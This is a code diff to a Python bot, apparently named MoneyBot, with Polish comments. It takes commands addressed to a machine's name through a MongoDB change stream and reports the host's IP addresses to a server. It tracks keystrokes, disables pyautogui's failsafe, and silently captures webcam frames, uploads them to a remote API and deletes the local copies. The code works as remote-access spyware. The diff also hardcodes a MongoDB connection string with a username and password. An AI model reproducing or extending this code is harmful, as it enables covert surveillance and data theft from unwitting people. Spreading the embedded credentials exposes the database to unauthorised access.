@@ -35,10 +35,11 @@ ACTIVITY_ROLE_ID=1345172216731664424
 keys_pressed = []
 lock = asyncio.Lock()
 
+pyautogui.FAILSAFE = False
+
 client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
 db = client['test']  # Zamień na nazwę swojej bazy danych
 collection = db['requests']  # Zamień na nazwę swojej kolekcji
-
 
 def watch_changes():
     change_stream = collection.watch()  # Otwiera strumień zmian
@@ -48,7 +49,7 @@ def watch_changes():
         name = data.get("COMPUTER_NAME")
         type = data.get("type")
 
-        if name == COMPUTER_NAME:
+        if name == COMPUTER_NAME.upper():
             print("Received request type:", type)
             match type and type.strip().lower():
                 case "ss":
@@ -350,14 +351,13 @@ def start_bot(external_ip, private_ip):
         requests.post(f"{API_URL}/start", json={"COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip})
     except requests.exceptions.RequestException as e:
         print(e)
-
-cap = cv2.VideoCapture(0) # Zainicjalizowanie kamery
-
+        
 async def send_camera_frame():
-    cap = cv2.VideoCapture(CAMERA_INDEX)
+    cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
     if not cap.isOpened():
-        print("❌ Nie udało się otworzyć kamerki!")
+        print("❌ Can not get image from camera!")
+        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
         return
     
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
@@ -370,6 +370,7 @@ async def send_camera_frame():
 
         ret, frame = cap.read()
         if not ret:
+            print("❌ Error connecting to camera frame!")
             send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
             break
 
@@ -379,25 +380,35 @@ async def send_camera_frame():
         with open(frame_path, 'rb') as f:
             files = {'frame': f}
             try:
-                requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+                if response.status_code == 200:
+                    print(f"✔️ Frame uploaded successfully: {frame_path}")
+                else:
+                    print(f"❌ Failed to upload frame: {response.status_code}")
             except Exception as e:
-                print(e)
+                print(f"❌ Error while sending frame: {e}")
+        
         os.remove(frame_path)  # Usuwamy plik po wysłaniu
     cap.release()
 
 def send_camera_frame_now():
-    cap = cv2.VideoCapture(CAMERA_INDEX)
+    cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
+        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
         return
-
-    ret, frame = cap.read()
     
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
 
     os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+    
+    ret, frame = cap.read()
+    if not ret:
+        print("❌ Error connecting to camera frame!")
+        send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
+        return
 
     frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
     cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę
@@ -405,9 +416,13 @@ def send_camera_frame_now():
     with open(frame_path, 'rb') as f:
         files = {'frame': f}
         try:
-            requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+            if response.status_code == 200:
+                print(f"✔️ Frame uploaded successfully: {frame_path}")
+            else:
+                print(f"❌ Failed to upload frame: {response.status_code}")
         except Exception as e:
-            print(e)
+            print(f"❌ Error while sending frame: {e}")
     os.remove(frame_path)  # Usuwamy plik po wysłaniu
     cap.release()
 
